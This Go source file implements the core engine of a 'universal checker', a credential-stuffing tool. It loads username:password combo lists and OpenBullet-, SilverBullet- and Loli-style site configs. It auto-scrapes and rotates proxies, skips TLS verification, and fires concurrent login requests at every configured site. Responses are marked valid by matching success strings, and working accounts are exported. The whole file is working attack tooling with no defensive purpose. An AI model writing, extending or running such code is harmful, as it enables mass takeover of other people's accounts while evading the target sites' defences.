package checker

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"universal-checker/internal/config"
	"universal-checker/internal/logger"
	"universal-checker/internal/proxy"
	"universal-checker/pkg/types"
)

// GlobalChecker represents the enhanced global checker engine
// that tests combos against all loaded configs as a unified process
type GlobalChecker struct {
	Config      *types.CheckerConfig
	Stats       *types.GlobalCheckerStats
	Proxies     []types.Proxy
	Configs     []types.Config
	Combos      []types.Combo
	
	// Channels for communication
	taskChan   chan types.GlobalWorkerTask
	resultChan chan types.GlobalWorkerResult
	logChan    chan types.LogEntry
	
	// Worker management
	ctx        context.Context
	cancel     context.CancelFunc
	wg         sync.WaitGroup
	
	// Statistics tracking
	statsMutex sync.RWMutex
	
	// Proxy rotation
	proxyIndex int
	proxyMutex sync.Mutex
	
	// Result exporter
	exporter   *ResultExporter
	
	// Logging
	logger     *Logger
}

// NewGlobalChecker creates a new enhanced global checker instance
func NewGlobalChecker(config *types.CheckerConfig) *GlobalChecker {
	ctx, cancel := context.WithCancel(context.Background())
	
	return &GlobalChecker{
		Config:     config,
		Stats:      &types.GlobalCheckerStats{},
		Proxies:    make([]types.Proxy, 0),
		Configs:    make([]types.Config, 0),
		Combos:     make([]types.Combo, 0),
		taskChan:   make(chan types.GlobalWorkerTask, config.MaxWorkers*2),
		resultChan: make(chan types.GlobalWorkerResult, config.MaxWorkers*2),
		logChan:    make(chan types.LogEntry, 1000),
		ctx:        ctx,
		cancel:     cancel,
		exporter:   NewResultExporter(config.OutputDirectory, config.OutputFormat),
		logger:     NewLogger(),
	}
}

// LoadConfigs loads multiple configuration files of different types
func (gc *GlobalChecker) LoadConfigs(configPaths []string) error {
	parser := config.NewParser()
	
	for _, configPath := range configPaths {
		gc.Log("info", fmt.Sprintf("Loading config: %s", configPath))
		
		cfg, err := parser.ParseConfig(configPath)
		if err != nil {
			gc.Log("error", fmt.Sprintf("Failed to parse config %s: %v", configPath, err))
			return fmt.Errorf("failed to parse config %s: %v", configPath, err)
		}
		
		gc.Configs = append(gc.Configs, *cfg)
		gc.Log("success", fmt.Sprintf("Successfully loaded %s config: %s", cfg.Type, cfg.Name))
	}
	
	gc.Stats.TotalConfigs = len(gc.Configs)
	gc.Log("info", fmt.Sprintf("Total configs loaded: %d", len(gc.Configs)))
	return nil
}

// LoadCombos loads combos from a file with enhanced parsing
func (gc *GlobalChecker) LoadCombos(comboPath string) error {
	gc.Log("info", fmt.Sprintf("Loading combos from: %s", comboPath))
	
	file, err := os.Open(comboPath)
	if err != nil {
		gc.Log("error", fmt.Sprintf("Failed to open combo file: %v", err))
		return err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	lineNum := 0
	for scanner.Scan() {
		lineNum++
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		combo := gc.parseCombo(line)
		if combo != nil {
			gc.Combos = append(gc.Combos, *combo)
		} else {
			gc.Log("warning", fmt.Sprintf("Invalid combo format at line %d: %s", lineNum, line))
		}
	}

	gc.Stats.TotalCombos = len(gc.Combos)
	gc.Log("success", fmt.Sprintf("Loaded %d valid combos", len(gc.Combos)))
	return scanner.Err()
}

// LoadProxies loads proxies with enhanced validation
func (gc *GlobalChecker) LoadProxies(proxyPath string) error {
	if gc.Config.AutoScrapeProxies {
		gc.Log("info", "Auto-scraping proxies from multiple sources...")
		// Initialize logger for proxy scraper
		loggerConfig := logger.LoggerConfig{
			Level:      logger.DEBUG,
			JSONFormat: false,
			BufferSize: 100,
			Component:  "proxy-scraper",
		}
		proxyLogger, err := logger.NewStructuredLogger(loggerConfig)
		if err != nil {
			gc.Log("warning", fmt.Sprintf("Failed to create proxy logger: %v", err))
			proxyLogger = nil
		}
		
		scraper := proxy.NewScraper(gc.Config, proxyLogger)
		proxies, err := scraper.ScrapeAndValidate()
		if err != nil {
			gc.Log("error", fmt.Sprintf("Failed to scrape proxies: %v", err))
			return err
		}
		gc.Proxies = proxies
		gc.Log("success", fmt.Sprintf("Auto-scraped %d working proxies", len(proxies)))
	} else if proxyPath != "" {
		gc.Log("info", fmt.Sprintf("Loading proxies from: %s", proxyPath))
		
		file, err := os.Open(proxyPath)
		if err != nil {
			gc.Log("error", fmt.Sprintf("Failed to open proxy file: %v", err))
			return err
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		lineNum := 0
		for scanner.Scan() {
			lineNum++
			line := strings.TrimSpace(scanner.Text())
			if line == "" || strings.HasPrefix(line, "#") {
				continue
			}

			proxy := gc.parseProxy(line)
			if proxy != nil {
				gc.Proxies = append(gc.Proxies, *proxy)
			} else {
				gc.Log("warning", fmt.Sprintf("Invalid proxy format at line %d: %s", lineNum, line))
			}
		}
		
		gc.Log("success", fmt.Sprintf("Loaded %d proxies", len(gc.Proxies)))
	}

	gc.Stats.TotalProxies = len(gc.Proxies)
	return nil
}

// Start starts the global checking process
func (gc *GlobalChecker) Start() error {
	gc.Stats.StartTime = time.Now()
	gc.Log("info", fmt.Sprintf("Starting global checker with %d workers", gc.Config.MaxWorkers))
	
	// Validate we have configs and combos
	if len(gc.Configs) == 0 {
		return fmt.Errorf("no configs loaded")
	}
	if len(gc.Combos) == 0 {
		return fmt.Errorf("no combos loaded")
	}
	
	// Calculate total tasks (each combo tested as a unified global check)
	gc.Stats.TotalTasks = len(gc.Combos)
	
	// Start log processor
	go gc.processLogs()
	
	// Start workers
	for i := 0; i < gc.Config.MaxWorkers; i++ {
		gc.wg.Add(1)
		go gc.globalWorker(i)
	}

	// Start result processor
	go gc.processResults()

	// Generate global tasks
	go gc.generateGlobalTasks()

	gc.Log("success", "Global checker started successfully")
	return nil
}

// Stop stops the checking process
func (gc *GlobalChecker) Stop() {
	gc.Log("info", "Stopping global checker...")
	gc.cancel()
	close(gc.taskChan)
	gc.wg.Wait()
	close(gc.resultChan)
	close(gc.logChan)
	gc.Log("success", "Global checker stopped")
}

// globalWorker is the enhanced worker that processes global tasks
func (gc *GlobalChecker) globalWorker(workerID int) {
	defer gc.wg.Done()
	
	gc.Log("debug", fmt.Sprintf("Worker %d started", workerID))

	for {
		select {
		case <-gc.ctx.Done():
			gc.Log("debug", fmt.Sprintf("Worker %d stopped", workerID))
			return
		case task, ok := <-gc.taskChan:
			if !ok {
				gc.Log("debug", fmt.Sprintf("Worker %d: task channel closed", workerID))
				return
			}

			result := gc.processGlobalTask(task, workerID)
			gc.resultChan <- result
		}
	}
}

// generateGlobalTasks generates global tasks - each combo tested against ALL configs as one unified test
func (gc *GlobalChecker) generateGlobalTasks() {
	gc.Log("info", "Generating global tasks...")
	
	for i, combo := range gc.Combos {
		// Each combo gets tested against ALL configs as a unified global check
		var proxy *types.Proxy
		if len(gc.Proxies) > 0 {
			proxy = gc.getNextProxy()
		}

		task := types.GlobalWorkerTask{
			TaskID:  i + 1,
			Combo:   combo,
			Configs: gc.Configs, // ALL configs for this combo
			Proxy:   proxy,
		}

		select {
		case <-gc.ctx.Done():
			gc.Log("debug", "Task generation stopped")
			return
		case gc.taskChan <- task:
			gc.Log("debug", fmt.Sprintf("Generated task %d for combo: %s", i+1, combo.Username))
		}
	}
	
	gc.Log("info", fmt.Sprintf("Generated %d global tasks", len(gc.Combos)))
}

// processGlobalTask processes a global task - testing a combo against all configs
func (gc *GlobalChecker) processGlobalTask(task types.GlobalWorkerTask, workerID int) types.GlobalWorkerResult {
	start := time.Now()
	
	gc.Log("debug", fmt.Sprintf("Worker %d processing task %d: %s", workerID, task.TaskID, task.Combo.Username))
	
	result := types.GlobalWorkerResult{
		TaskID:     task.TaskID,
		Combo:      task.Combo,
		Results:    make([]types.CheckResult, 0),
		OverallStatus: "invalid", // Default
		Timestamp:  time.Now(),
		WorkerID:   workerID,
		Proxy:      task.Proxy,
	}
	
	// Test combo against ALL configs
	validCount := 0
	errorCount := 0
	
	for _, config := range task.Configs {
		checkResult := gc.checkComboAgainstConfig(task.Combo, config, task.Proxy, workerID)
		result.Results = append(result.Results, checkResult)
		
		switch checkResult.Status {
		case "valid":
			validCount++
		case "error":
			errorCount++
		}
		
		// Add delay between config tests if configured
		if len(task.Configs) > 1 && config.Delay > 0 {
			time.Sleep(time.Duration(config.Delay) * time.Millisecond)
		}
	}
	
	// Determine overall status based on results
	if errorCount == len(task.Configs) {
		result.OverallStatus = "error"
	} else if validCount > 0 {
		result.OverallStatus = "valid"
		result.ValidConfigCount = validCount
	} else {
		result.OverallStatus = "invalid"
	}
	
	result.Latency = int(time.Since(start).Milliseconds())
	
	gc.Log("debug", fmt.Sprintf("Worker %d completed task %d: %s (%s, %d/%d valid)", 
		workerID, task.TaskID, task.Combo.Username, result.OverallStatus, validCount, len(task.Configs)))
	
	return result
}

// checkComboAgainstConfig tests a single combo against a single config
func (gc *GlobalChecker) checkComboAgainstConfig(combo types.Combo, config types.Config, proxy *types.Proxy, workerID int) types.CheckResult {
	start := time.Now()
	
	// Create HTTP client
	client := gc.createHTTPClient(proxy, config)
	
	// Build request
	req, err := gc.buildRequest(combo, config)
	if err != nil {
		gc.Log("error", fmt.Sprintf("Worker %d: Failed to build request for %s against %s: %v", 
			workerID, combo.Username, config.Name, err))
		return types.CheckResult{
			Combo:     combo,
			Config:    config.Name,
			Status:    "error",
			Error:     err.Error(),
			Timestamp: time.Now(),
			Latency:   int(time.Since(start).Milliseconds()),
		}
	}
	
	// Execute request with retries
	var resp *http.Response
	var lastErr error
	
	for attempt := 0; attempt <= config.Retries; attempt++ {
		resp, lastErr = client.Do(req)
		if lastErr == nil {
			break
		}
		
		if attempt < config.Retries {
			gc.Log("warning", fmt.Sprintf("Worker %d: Retry %d/%d for %s against %s: %v", 
				workerID, attempt+1, config.Retries, combo.Username, config.Name, lastErr))
			time.Sleep(time.Duration(500+attempt*200) * time.Millisecond) // Exponential backoff
		}
	}
	
	if lastErr != nil {
		gc.Log("error", fmt.Sprintf("Worker %d: Request failed for %s against %s after %d retries: %v", 
			workerID, combo.Username, config.Name, config.Retries, lastErr))
		return types.CheckResult{
			Combo:     combo,
			Config:    config.Name,
			Status:    "error",
			Error:     lastErr.Error(),
			Timestamp: time.Now(),
			Latency:   int(time.Since(start).Milliseconds()),
		}
	}
	defer resp.Body.Close()
	
	// Read response
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		gc.Log("error", fmt.Sprintf("Worker %d: Failed to read response for %s against %s: %v", 
			workerID, combo.Username, config.Name, err))
		return types.CheckResult{
			Combo:     combo,
			Config:    config.Name,
			Status:    types.BotStatusError,
			Error:     err.Error(),
			Timestamp: time.Now(),
			Latency:   int(time.Since(start).Milliseconds()),
		}
	}
	
	// Analyze response
	status := gc.analyzeResponse(string(body), resp.StatusCode, config)
	
	if status == types.BotStatusSuccess {
		gc.Log("success", fmt.Sprintf("Worker %d: VALID combo found - %s against %s", 
			workerID, combo.Username, config.Name))
	}
	
	return types.CheckResult{
		Combo:     combo,
		Config:    config.Name,
			Status:    status,
		Response:  string(body),
		Proxy:     proxy,
		Timestamp: time.Now(),
		Latency:   int(time.Since(start).Milliseconds()),
	}
}

// processResults processes results from global workers
func (gc *GlobalChecker) processResults() {
	for result := range gc.resultChan {
		gc.updateGlobalStats(result)
		
		// Save results if needed
		if !gc.Config.SaveValidOnly || result.OverallStatus == "valid" {
			gc.saveGlobalResult(result)
		}
	}
}

// updateGlobalStats updates checker statistics
func (gc *GlobalChecker) updateGlobalStats(result types.GlobalWorkerResult) {
	gc.statsMutex.Lock()
	defer gc.statsMutex.Unlock()

	switch result.OverallStatus {
	case "valid":
		gc.Stats.ValidCombos++
	case "invalid":
		gc.Stats.InvalidCombos++
	case "error":
		gc.Stats.ErrorCombos++
	}
	
	gc.Stats.ProcessedTasks++

	// Update CPM based on processed tasks
	elapsed := time.Since(gc.Stats.StartTime).Minutes()
	if elapsed > 0 {
		gc.Stats.CurrentCPM = float64(gc.Stats.ProcessedTasks) / elapsed
	}
}

// Log sends a log entry to the log channel
func (gc *GlobalChecker) Log(level, message string) {
	select {
	case gc.logChan <- types.LogEntry{
		Level:     level,
		Message:   message,
		Timestamp: time.Now(),
	}:
	default:
		// Log channel full, write to standard log as fallback
		log.Printf("[%s] %s", strings.ToUpper(level), message)
	}
}

// GetLogs returns recent log entries for GUI display
func (gc *GlobalChecker) GetLogs() []types.LogEntry {
	return gc.logger.GetRecent(100)
}

// processLogs processes log entries
func (gc *GlobalChecker) processLogs() {
	for logEntry := range gc.logChan {
		gc.logger.Add(logEntry)
		// Also write to standard log
		log.Printf("[%s] %s", strings.ToUpper(logEntry.Level), logEntry.Message)
	}
}

// Helper methods (similar to original but enhanced)
func (gc *GlobalChecker) createHTTPClient(proxy *types.Proxy, config types.Config) *http.Client {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:    100,
		MaxIdleConnsPerHost: 10,
		IdleConnTimeout: 30 * time.Second,
	}

	if proxy != nil && config.UseProxy {
		proxyURL, err := url.Parse(fmt.Sprintf("%s://%s:%d", string(proxy.Type), proxy.Host, proxy.Port))
		if err == nil {
			if proxy.Username != "" && proxy.Password != "" {
				proxyURL.User = url.UserPassword(proxy.Username, proxy.Password)
			}
			transport.Proxy = http.ProxyURL(proxyURL)
		}
	}

	timeout := config.Timeout
	if timeout <= 0 {
		timeout = gc.Config.RequestTimeout
	}

	return &http.Client{
		Transport: transport,
		Timeout:   time.Duration(timeout) * time.Millisecond,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if !config.FollowRedirects {
				return http.ErrUseLastResponse
			}
			if len(via) >= 10 {
				return fmt.Errorf("stopped after 10 redirects")
			}
			return nil
		},
	}
}

// Enhanced buildRequest with better variable replacement and encoding
func (gc *GlobalChecker) buildRequest(combo types.Combo, config types.Config) (*http.Request, error) {
	// Replace variables in URL
	requestURL := gc.replaceVariables(config.URL, combo)
	
	// Create request
	var req *http.Request
	var err error

	if config.Method == "GET" {
		req, err = http.NewRequest("GET", requestURL, nil)
	} else {
		// Build form data or JSON payload based on config
		var body string
		if len(config.Data) > 0 {
			body = gc.buildFormData(config.Data, combo)
		}
		req, err = http.NewRequest(config.Method, requestURL, strings.NewReader(body))
	}

	if err != nil {
		return nil, err
	}

	// Set headers with variable replacement
	for key, value := range config.Headers {
		req.Header.Set(key, gc.replaceVariables(value, combo))
	}

	// Set content type for POST requests if not already set
	if config.Method == "POST" && req.Header.Get("Content-Type") == "" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}

	// Set cookies
	for name, value := range config.Cookies {
		req.AddCookie(&http.Cookie{
			Name:  name,
			Value: gc.replaceVariables(value, combo),
		})
	}

	return req, nil
}

// Enhanced variable replacement with more patterns
func (gc *GlobalChecker) replaceVariables(text string, combo types.Combo) string {
	// OpenBullet style
	text = strings.ReplaceAll(text, "<USER>", combo.Username)
	text = strings.ReplaceAll(text, "<PASS>", combo.Password)
	text = strings.ReplaceAll(text, "<EMAIL>", combo.Email)
	
	// SilverBullet style
	text = strings.ReplaceAll(text, "<username>", combo.Username)
	text = strings.ReplaceAll(text, "<password>", combo.Password)
	text = strings.ReplaceAll(text, "<email>", combo.Email)
	
	// Loli style
	text = strings.ReplaceAll(text, "[USERNAME]", combo.Username)
	text = strings.ReplaceAll(text, "[PASSWORD]", combo.Password)
	text = strings.ReplaceAll(text, "[EMAIL]", combo.Email)
	
	// Alternative formats
	text = strings.ReplaceAll(text, "{USER}", combo.Username)
	text = strings.ReplaceAll(text, "{PASS}", combo.Password)
	text = strings.ReplaceAll(text, "{EMAIL}", combo.Email)
	
	return text
}

// Enhanced form data building
func (gc *GlobalChecker) buildFormData(data map[string]interface{}, combo types.Combo) string {
	var formData []string
	
	for key, value := range data {
		valueStr := fmt.Sprintf("%v", value)
		valueStr = gc.replaceVariables(valueStr, combo)
		formData = append(formData, fmt.Sprintf("%s=%s", url.QueryEscape(key), url.QueryEscape(valueStr)))
	}
	
	return strings.Join(formData, "&")
}

// Enhanced response analysis with regex support
func (gc *GlobalChecker) analyzeResponse(body string, statusCode int, config types.Config) types.BotStatus {
	// Check status codes first
	for _, successCode := range config.SuccessStatus {
		if statusCode == successCode {
			return types.BotStatusSuccess
		}
	}
	
	for _, failureCode := range config.FailureStatus {
		if statusCode == failureCode {
			return types.BotStatusFail
		}
	}

	// Check success strings (case-insensitive)
	for _, successStr := range config.SuccessStrings {
		if strings.Contains(body, successStr) {
			return types.BotStatusSuccess
		}
	}

	// Check failure strings (case-insensitive)
	for _, failureStr := range config.FailureStrings {
		if strings.Contains(body, failureStr) {
			return types.BotStatusFail
		}
	}

	// Default to invalid if no specific conditions match
	return types.BotStatusFail
}

// Enhanced proxy rotation with health checking
func (gc *GlobalChecker) getNextProxy() *types.Proxy {
	gc.proxyMutex.Lock()
	defer gc.proxyMutex.Unlock()

	if len(gc.Proxies) == 0 {
		return nil
	}

	// Get working proxies only
	workingProxies := gc.getWorkingProxies()
	if len(workingProxies) == 0 {
		// If no working proxies, try to use any available
		workingProxies = gc.Proxies
	}

	if gc.Config.ProxyRotation {
		proxy := &workingProxies[gc.proxyIndex%len(workingProxies)]
		gc.proxyIndex++
		return proxy
	}

	// Random proxy selection
	return &workingProxies[rand.Intn(len(workingProxies))]
}

// Enhanced combo parsing with better email detection
func (gc *GlobalChecker) parseCombo(line string) *types.Combo {
	// Support different formats: username:password, email:password
	parts := strings.Split(line, ":")
	if len(parts) < 2 {
		return nil
	}

	combo := &types.Combo{
		Line:     line,
		Username: strings.TrimSpace(parts[0]),
		Password: strings.TrimSpace(strings.Join(parts[1:], ":")), // Handle passwords with colons
	}

	// Check if username looks like an email
	if strings.Contains(combo.Username, "@") && strings.Contains(combo.Username, ".") {
		combo.Email = combo.Username
	}

	return combo
}

// Enhanced proxy parsing with authentication support
func (gc *GlobalChecker) parseProxy(line string) *types.Proxy {
	parts := strings.Split(line, ":")
	if len(parts) < 2 {
		return nil
	}

	proxy := &types.Proxy{
		Host: strings.TrimSpace(parts[0]),
		Port: gc.parseInt(strings.TrimSpace(parts[1])),
		Type: types.ProxyTypeHTTP, // Default to HTTP
		Working: true, // Assume working until proven otherwise
	}

	// Parse optional type and auth
	if len(parts) > 2 {
		// Could be type or username
		third := strings.ToLower(strings.TrimSpace(parts[2]))
		switch third {
		case "socks4":
			proxy.Type = types.ProxyTypeSOCKS4
		case "socks5":
			proxy.Type = types.ProxyTypeSOCKS5
		case "https":
			proxy.Type = types.ProxyTypeHTTPS
		default:
			// Assume it's username
			proxy.Username = third
			if len(parts) > 3 {
				proxy.Password = strings.TrimSpace(parts[3])
			}
		}
	}

	return proxy
}

// Helper method to parse integers safely
func (gc *GlobalChecker) parseInt(s string) int {
	if i, err := strconv.Atoi(s); err == nil {
		return i
	}
	return 0
}

// GetStats returns current global statistics
func (gc *GlobalChecker) GetGlobalStats() types.GlobalCheckerStats {
	gc.statsMutex.RLock()
	defer gc.statsMutex.RUnlock()
	
	stats := *gc.Stats
	stats.ElapsedTime = int(time.Since(gc.Stats.StartTime).Seconds())
	stats.ActiveWorkers = gc.Config.MaxWorkers
	stats.WorkingProxies = len(gc.getWorkingProxies())
	
	return stats
}

// getWorkingProxies returns only working proxies
func (gc *GlobalChecker) getWorkingProxies() []types.Proxy {
	var working []types.Proxy
	for _, proxy := range gc.Proxies {
		if proxy.Working {
			working = append(working, proxy)
		}
	}
	return working
}

// saveGlobalResult saves a global result to file
func (gc *GlobalChecker) saveGlobalResult(result types.GlobalWorkerResult) {
	if err := gc.exporter.ExportGlobalResult(result); err != nil {
		gc.Log("error", fmt.Sprintf("Failed to export result: %v", err))
	}
}

